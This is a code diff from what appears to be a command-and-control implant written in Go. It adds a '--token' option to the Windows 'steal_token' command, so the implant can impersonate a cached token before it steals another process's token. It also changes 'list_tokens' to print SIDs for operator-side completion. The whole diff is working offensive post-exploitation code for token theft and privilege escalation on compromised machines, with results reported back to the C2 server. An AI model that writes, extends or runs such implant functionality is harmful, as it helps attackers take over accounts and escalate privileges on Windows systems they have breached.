@@ -20,11 +20,12 @@ func platformCommands(cmd *cobra.Command) {
 	stealTokenCmd := &cobra.Command{
 		Use:     def.C2CmdStealToken,
 		Short:   "Steal token from process; store in memory for future use",
-		Example: fmt.Sprintf("%s --pid <pid>", def.C2CmdStealToken),
+		Example: fmt.Sprintf("%s --pid <pid> [--token <sid>]", def.C2CmdStealToken),
 		GroupID: "windows",
 		Run:     runStealToken,
 	}
 	stealTokenCmd.Flags().StringP("pid", "", "", "PID of the process to steal token from")
+	stealTokenCmd.Flags().StringP("token", "", "", "SID of an existing cached token to impersonate before stealing")
 	cmd.AddCommand(stealTokenCmd)
 
 	// !list_tokens
@@ -49,7 +50,26 @@ func runStealToken(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Error: args error: PID is invalid: %s", args)
 		return
 	}
-	hToken, err := priv.StealToken(syscall.RuntimeSyscallTable, uint32(pid))
+
+	// If an existing token SID is provided, pass its handle to StealToken
+	// so it can impersonate before opening the target process.
+	tokenSID, _ := cmd.Flags().GetString("token")
+	var hExisting windows.Handle
+	if tokenSID != "" {
+		raw, ok := priv.TokenMap.Load(tokenSID)
+		if !ok {
+			c2transport.NotifyC2(cmd, "Error: token not found for SID %q", tokenSID)
+			return
+		}
+		var ok2 bool
+		hExisting, ok2 = raw.(windows.Handle)
+		if !ok2 {
+			c2transport.NotifyC2(cmd, "Error: invalid token handle for SID %q", tokenSID)
+			return
+		}
+	}
+
+	hToken, err := priv.StealToken(syscall.RuntimeSyscallTable, uint32(pid), hExisting)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "%s", err.Error())
 		return
@@ -77,7 +97,8 @@ func runListTokens(cmd *cobra.Command, _ []string) {
 			return true
 		}
 		friendly := priv.GetTokenFriendlyName(hToken)
-		entries = append(entries, friendly)
+		// Output SID first so the CC-side completer can use it directly
+		entries = append(entries, fmt.Sprintf("%s  %s", sid, friendly))
 		return true
 	})
 
